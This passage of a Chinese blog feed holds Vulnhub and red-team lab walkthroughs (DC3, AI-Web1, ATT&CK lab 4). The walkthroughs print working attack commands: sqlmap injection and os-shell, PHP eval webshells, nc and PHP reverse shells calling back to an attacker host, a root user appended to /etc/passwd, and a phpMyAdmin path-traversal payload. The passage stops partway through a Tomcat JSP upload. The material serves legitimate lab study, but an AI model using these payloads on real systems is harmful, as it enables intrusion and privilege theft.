src="/2024/02/24/vulnhub%E2%80%94DC3-2/24.jpg" class=""><p>编译代码并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> <br>./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/25.jpg" class=""><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/26.jpg" class=""><p>也可以使用python的交互式控制</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spaw(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/27.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>vulnhub靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ai-Web1</title>
    <link href="/2024/02/24/vulnhub%E2%80%94Ai-Web1/"/>
    <url>/2024/02/24/vulnhub%E2%80%94Ai-Web1/</url>
    
    <content type="html"><![CDATA[<p>攻击机IP：192.168.12.128/usr/share/dirbuster</p><h1>主机发现</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span>：nmap -sn -PR <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">netdiscover</span>(kali)：discover -r <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/2.jpg" class=""><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/1-16789523187727.jpg" class=""><p>目标主机IP：192.168.12.129</p><h1>端口探测</h1><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -sS -sV -<span class="hljs-keyword">A</span> -n <span class="hljs-number">192.168.12.129</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/3.jpg" class=""><p>开启了80端口</p><h1>dirb目录扫描</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirb http:<span class="hljs-comment">//192.168.12.129</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/4.jpg" class=""><p><strong>访问/robots.txt</strong></p><p>出现两个目录，都无权访问</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/5.jpg" class=""><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/6.jpg" class=""><p><strong>扫描…/m3diNf0/目录</strong></p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/8.jpg" class=""><p>发现info：<a href="http://192.168.12.129//m3diNf0/info.php">http://192.168.12.129//m3diNf0/info.php</a></p><p>访问，发现绝对路径：/home/www/html/web1x443290o2sdf92213</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/10.jpg" class=""><p>这个目录下没有什么可以利用的信息，换第二个路径进行爆破</p><p><strong>扫描…/se3reTdir777/uploads/</strong></p><p>没有什么发现</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/11.jpg" class=""><p><strong>扫描…/se3reTdir777/</strong></p><p>有一个index文件：<a href="http://192.168.12.129/se3reTdir777/index.php">http://192.168.12.129/se3reTdir777/index.php</a></p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/12.jpg" class=""><p><strong>访问index.php</strong></p><p>得到数据库类型为MySQL</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/13.jpg" class=""><p>访问<a href="http://192.168.12.129/se3reTdir777/index.php">http://192.168.12.129/se3reTdir777/index.php</a></p><p>发现疑似注入点</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/14.jpg" class=""><p>测试是否存在SQL注入</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/15.jpg" class=""><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>有回显说明存在SQL注入漏洞</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/16.jpg" class=""><p><strong>bp抓包确认注入地址</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">uid</span>=hello&amp;Operation=Submit<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/17.jpg" class=""><h1>使用sqlmap进行攻击</h1><p><strong>爆破数据库名</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.129/se3reTdir777/&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> <span class="hljs-params">--dbs</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/18.jpg" class=""><p>爆破出 aiweb1 information_schema两个数据库，猜测想要的数据在aiweb1数据库里</p><p><strong>爆破表名</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.129/se3reTdir777/&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/19.jpg" class=""><p><strong>爆破user表</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.129/se3reTdir777/&quot;</span> --data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T <span class="hljs-keyword">user</span> <span class="hljs-title">--columns</span><br></code></pre></td></tr></table></figure><p>发现没有可用的信息</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/20.jpg" class=""><h1>问题：列名无可用信息，os-shell</h1><p>尝试使用sqlmap的–os-shell命令</p><ul><li>os-shell执行条件有三个：<br>　 1.网站必须是root权限<br>2.网站的绝对路径已知<br>3.GPC为off（php主动转义的功能关闭）</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.129/se3reTdir777/&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span>  <span class="hljs-attr">--level</span>=<span class="hljs-number">3</span> <span class="hljs-attr">--os-shell</span><br><br>依次选择 <span class="hljs-built_in">php</span>(default)，custom <span class="hljs-built_in">location</span>(s)<br>根据前面找到的info.php文件暴露的信息（在robots.txt中），绝对路径选择：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/<br>uploads的目录是可以成功写入的<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/21.jpg" class=""><p>成功反弹到shell，但是权限极低，面临提权问题，<strong>www-data权限比较低</strong>，不是root权限</p><h1>提权</h1><h2 id="方法一">方法一</h2><h3 id="文件上传">文件上传</h3><p>1、准备一句话木马webshell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.129/se3reTdir777/&quot;</span> --data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span> C:<span class="hljs-regexp">/tools/</span>tool_file<span class="hljs-regexp">/webshell.php --file-dest /</span>home<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/web1x443290o2sdf92213/</span>se3reTdir777<span class="hljs-regexp">/uploads/</span>hack.php<br></code></pre></td></tr></table></figure><p>–file-write:去读取文件(webshell.php)</p><p>–file-dest:后面加目标的绝对路径 已经生成木马的名称（hack.php）</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/22.jpg" class=""><p>接着访问<a href="http://192.168.12.129/se3reTdir777/uploads/hack.php">http://192.168.12.129/se3reTdir777/uploads/hack.php</a> 如果是空白的说明上传的木马成功了</p><h3 id="使用蚁剑连接">使用蚁剑连接</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ip：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">12.129</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/hack.php<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/23.jpg" class=""><h3 id="反弹shell">反弹shell</h3><ol><li><p>攻击机中使用nc进行侦听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure></li><li><p>蚁剑中连接，回弹shall</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.12.128 6666 &gt;/tmp/f<br></code></pre></td></tr></table></figure><p>注意是在蚁剑中连接侦听的攻击机····128</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/26-16791435818122.jpg" class=""></li><li><p>侦听窗口有响应后，通过python进行交互</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure></li></ol><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/27.jpg" class=""><h3 id="提权">提权</h3><ol><li><p>查看哪些可以执行root权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/28.jpg" class=""></li><li><p>查看内核版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br></code></pre></td></tr></table></figure><p>当前版本为：4.15.0-58-generic</p><p>可以使用<code>searchsploit linux kernel 4.15.0-58-generic</code> 搜一下相关的内核漏洞发现没有可以利用的文件，这里不用这个方法</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/29.jpg" class=""></li><li><p>提权方法：添加一个root（admin）账号</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt yuu <span class="hljs-number">345678</span><br></code></pre></td></tr></table></figure></li><li><p>执行命令：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">echo &#x27;yuu:<span class="hljs-variable">$1</span><span class="hljs-variable">$yuu</span><span class="hljs-variable">$r88arw59hCciCmo4axiM00</span><span class="hljs-regexp">/:0:0::/</span>root:<span class="hljs-regexp">/bin/</span>bash&#x27; <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure></li><li><p>登录新用户</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">su yuu</span><br></code></pre></td></tr></table></figure><p>输入密码，但是不知道为什么说没有权限</p></li><li><p>正常步骤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> flag.txt<br></code></pre></td></tr></table></figure></li></ol><h2 id="方法二">方法二</h2><h3 id="1、编写shell脚本：shell-php">1、编写shell脚本：shell.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$sock</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-string">&quot;192.168.12.128&quot;</span>,<span class="hljs-number">8888</span>);<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ip为攻击机的ip</p><h3 id="2、python3搭建简易服务器">2、python3搭建简易服务器</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">9966</span> --bind <span class="hljs-number">192.168.12.128</span><br></code></pre></td></tr></table></figure><p>在哪个路径下启动的网站，访问时主页时的路径就是该路径</p><p>访问一下看是否搭建成功</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/30.jpg" class=""><p>这里在桌面启动服务器，shell文件放在test文件夹下</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/31.jpg" class=""><h3 id="3、让目标主机下载shell文件">3、让目标主机下载shell文件</h3><p>回到控制目标的shell窗口，下载shell文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget -S http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">712.128</span>:<span class="hljs-number">9966</span><span class="hljs-regexp">/test/</span>shell.php<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/32.jpg" class=""><h3 id="4、侦听端口">4、侦听端口</h3><p>再在攻击机中开启一个新窗口，侦听8888端口</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">nc <span class="hljs-comment">--lvp 8888</span><br></code></pre></td></tr></table></figure><h3 id="5、运行shell">5、运行shell</h3><p>回到控制窗口，运行刚刚下载的文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php <span class="hljs-built_in">shell</span>.php<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/33.jpg" class=""><p>侦听端口中成功反弹shell</p><h3 id="6、提权到root">6、提权到root</h3><p>反弹shell后，在侦听端口中实现python交互</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/34.jpg" class=""><p>通过whoami命令可以看到，当前用户不是root用户，但是这个用户可以对/etc/passwd文件进行写入权限</p><h4 id="用openssl创建root用户">用openssl创建root用户</h4><p>用户：web1；密码：123456；使用salt加密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt web1 <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>生成的<code>$1$web1$ZrYgDZgZpLlsnVlxUaZwh/</code>为/etc/passwd需要存储的形式</p><h4 id="写入密码">写入密码</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">echo</span> <span class="hljs-string">&#x27;web1:<span class="hljs-variable">$1</span><span class="hljs-variable">$web1</span><span class="hljs-variable">$ZrYgDZgZpLlsnVlxUaZwh</span>/:0:0::/root:/bin/bash&#x27;</span>&gt;&gt;/etc/passwd<br></code></pre></td></tr></table></figure><p><code>(user):(pwd[salt])/:0:0:root:/bin/bash</code>为写入/etc/passwd的内容</p><h4 id="切换到新建的用户">切换到新建的用户</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">su</span> web1<br></code></pre></td></tr></table></figure><p>再次使用whoami查看权限，发现已经是root用户</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/35.jpg" class=""><h4 id="找到flag">找到flag</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root<br></code></pre></td></tr></table></figure><p>在root目录下找flag</p><img src="/2024/02/24/vulnhub%E2%80%94Ai-Web1/36.jpg" class=""><p>成功拿到flag：flag{cbe5831d864cbc2a104e2c2b9dfb50e5acbdee71}</p><h1>总结</h1><h2 id="步骤总结">步骤总结</h2><p>1.正常进行信息收集，通过爆破目录发现注入网页<br>2.判断注入，利用sqlmap进行自动化注入进行爆破重要信息，并判断数据库用户以及权限<br>3.利用os-shell反弹shell时，需要找到网站绝对路径并且路径需要允许写入<br>4.kali搭建简易服务器，操控靶机下载shell文件<br>5.正常的反弹shell<br>6.修改/etc/passwd文件直接添加root身份的用户进行提权<br>7.kali中openssl的使用</p><h2 id="知识点总结">知识点总结</h2><ol><li>当数据库列名中没有敏感信息显示时，可以使用<code>sql--os--shell</code></li><li>/etc/passwd存储密码的格式：<code>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</code></li></ol><p>（<code>&quot;x&quot;</code> 表示此用户设有密码，但不是真正的密码，真正的密码保存在 <code>/etc/shadow</code> 文件中<br>允许登入的<code>shell</code>就是<code>/bin/bash</code>禁止shell登入就是<code>/sbin/nologin</code>）</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ATT&amp;CK红队评估实战靶场4</title>
    <link href="/2024/02/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/"/>
    <url>/2024/02/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/</url>
    
    <content type="html"><![CDATA[<h1>环境搭建</h1><p>靶机地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">漏洞详情 (qiyuanxuetang.net)</a></p><h2 id="网络结构">网络结构</h2><p>kali是…130</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/1.png" class=""><h2 id="虚拟机设置">虚拟机设置</h2><ol><li><p>攻击机kali：192.168.12.130</p></li><li><p>Ubuntu（web）</p><p>IP1：192.168.12.135</p><p>IP2：192.168.183.128</p><p>pwd：ubuntu</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/2.jpg" class=""><p>开启对应漏洞：</p><p>开启struts2服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045<br>sudo docker-compose up -d<br></code></pre></td></tr></table></figure><p>开启tomcat服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/home/u</span>buntu<span class="hljs-regexp">/Desktop/</span>vulhub<span class="hljs-regexp">/tomcat/</span>CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">12615</span><br>sudo docker-compose up -d<br></code></pre></td></tr></table></figure><p>开启phpmyadmin服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/home/u</span>buntu<span class="hljs-regexp">/Desktop/</span>vulhub<span class="hljs-regexp">/phpmyadmin/</span>CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">12613</span><br>sudo docker-compose up -d<br></code></pre></td></tr></table></figure><p>查看容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo docker ps -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure></li><li><p>域成员机win7</p><p>IP：192.168.183.129</p><p>pwd：Dotest123</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/3.jpg" class=""></li><li><p>DC：</p><p>IP：192.168.183.130</p><p>pwd：Test2008→Demo2008.</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/4.jpg" class=""></li></ol><h1>外网</h1><h2 id="信息搜集">信息搜集</h2><h3 id="主机发现">主机发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netdiscover</span> -r <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>发现外网主机ubuntu192.168.12.135</p><h3 id="端口扫描">端口扫描</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sT -sV <span class="hljs-number">192.168.12.135</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">6</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>p1 Ubuntu <span class="hljs-number">2</span>ubuntu2.<span class="hljs-number">13</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">2001</span>/tcp open  http    Jetty <span class="hljs-number">9</span>.<span class="hljs-number">2</span>.<span class="hljs-number">11</span>.v20150529<br><span class="hljs-attribute">2002</span>/tcp open  http    Apache Tomcat <span class="hljs-number">8</span>.<span class="hljs-number">5</span>.<span class="hljs-number">19</span><br><span class="hljs-attribute">2003</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">25</span> ((Debian))<br></code></pre></td></tr></table></figure><p>扫到了操作系统Ubuntu Linux和开启的三个服务</p><p>利用struts-scan进行扫描</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">python2 struts-<span class="hljs-keyword">scan.py </span> <span class="hljs-string">&quot;192.168.12.135:2001&quot;</span><br></code></pre></td></tr></table></figure><p>按理说应该是有045和046漏洞的，不知道为什么没扫出来</p><p>struts-scan获取shell</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 struts-scan<span class="hljs-selector-class">.py</span>  -u  <span class="hljs-string">&quot;192.168.12.135:2001&quot;</span> -<span class="hljs-selector-tag">i</span> struts2-<span class="hljs-number">045</span><br></code></pre></td></tr></table></figure><p>扫描端口的详细信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -T4 -A <span class="hljs-number">192.168.12.135</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -<span class="hljs-literal">oN</span> nmap.A<br></code></pre></td></tr></table></figure><h2 id="利用phpmyadmin-Shell">利用phpmyadmin-Shell</h2><p>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">12135</span>:<span class="hljs-number">2003</span><span class="hljs-regexp">/index.php?target=db_sql.php%253f/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>9509b390fa928fbb857dc6cbf41d2565</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">12.135</span>:<span class="hljs-number">2003</span><span class="hljs-regexp">/index.php?target=db_datadict.php%253f/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/tmp/</span>sess_9509b390fa928fbb857dc6cbf41d2565<br><br></code></pre></td></tr></table></figure><h2 id="利用Tomcat-Shell">利用Tomcat-Shell</h2><p>访问，抓包</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.12.135:2002/</span><br></code></pre></td></tr></table></figure><h3 id="修改为put方式上传木马">修改为put方式上传木马</h3><figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vbscript-html"><span class="language-xml">PUT /shell.jsp/ HTTP/1.1</span><br><span class="language-xml"></span><span class="language-vbscript">&lt;%@ page import=<span class="hljs-string">&quot;java.util.*,java.io.*,java.net.*&quot;</span>%&gt;</span><span class="language-xml"></span><br><span class="language-xml"> </span><span class="language-vbscript">&lt;%</span><br><span class="language-vbscript"> %&gt;</span><span class="language-xml"></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span 